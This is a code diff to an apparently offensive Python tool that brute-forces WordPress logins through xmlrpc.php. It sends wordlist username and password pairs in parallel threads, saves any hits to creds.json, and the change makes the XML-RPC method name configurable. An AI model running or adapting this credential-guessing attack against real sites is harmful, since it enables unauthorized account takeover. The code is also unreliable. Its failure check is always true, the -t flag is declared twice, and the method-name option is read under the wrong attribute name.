@@ -19,8 +19,7 @@ def readlist(file):
     return list(set(data))
 
 
-def trylogin(url, username, password):
-    ## Write your custom request here ====================================
+def trylogin(url, methodName, username, password):
     session = requests.Session()
     # Get cookies
     r = session.get(url)
@@ -29,7 +28,7 @@ def trylogin(url, username, password):
         urljoin(url, "xmlrpc.php"),
         data=f"""
         <methodCall>
-        <methodName>wp.getUsersBlogs</methodName>
+        <methodName>{methodName}</methodName>
         <params>
         <param><value>{username}</value></param>
         <param><value>{password}</value></param>
@@ -37,15 +36,14 @@ def trylogin(url, username, password):
         </methodCall>
         """
     )
-    # Change the error message you want to detect here;
+
     if b'Incorrect username or password' or b'Identifiant ou mot de passe incorrect' in r.content:
         return False
     else:
         return True
-    ## Write your custom request here ====================================
 
-def worker(target, u, p):
-    if trylogin(target, u, p):
+def worker(target, methodName, u, p):
+    if trylogin(target, methodName, u, p):
         print("[+] Valid login found (%s, %s)" % (u, p))
         f = open("creds.json", "a")
         f.write(json.dumps({"username": u, "password": p}) + "\n")
@@ -57,6 +55,7 @@ def parseArgs():
     parser.add_argument("-u", "--users", default=None, required=True, help='Usernames wordlist')
     parser.add_argument("-p", "--passwords", default=None, required=True, help='Passwords wordlist')
     parser.add_argument("-t", "--target", default=None, required=True, help='Specify the target url')
+    parser.add_argument("-m", "--method-name", default="wp.getUsersBlogs", required=False, help='Specify methodName (default is wp.getUsersBlogs)')
     parser.add_argument("-t", "--threads", default=25, required=False, help='')
     parser.add_argument("-v", "--verbose", default=False, action="store_true", help='')
     return parser.parse_args()
@@ -68,6 +67,7 @@ if __name__ == '__main__':
     wordlist_usernames = readlist(options.users)
     wordlist_passwords = readlist(options.passwords)
     target = options.target
+    methodName = options.methodName
 
     # Generate combinations
     comb = []
@@ -78,4 +78,4 @@ if __name__ == '__main__':
     # Waits for all the threads to be completed
     with ThreadPoolExecutor(max_workers=min(options.threads, len(comb))) as tp:
         for _c in comb:
-            tp.submit(worker, target, _c[0], _c[1])
+            tp.submit(worker, target, methodName, _c[0], _c[1])
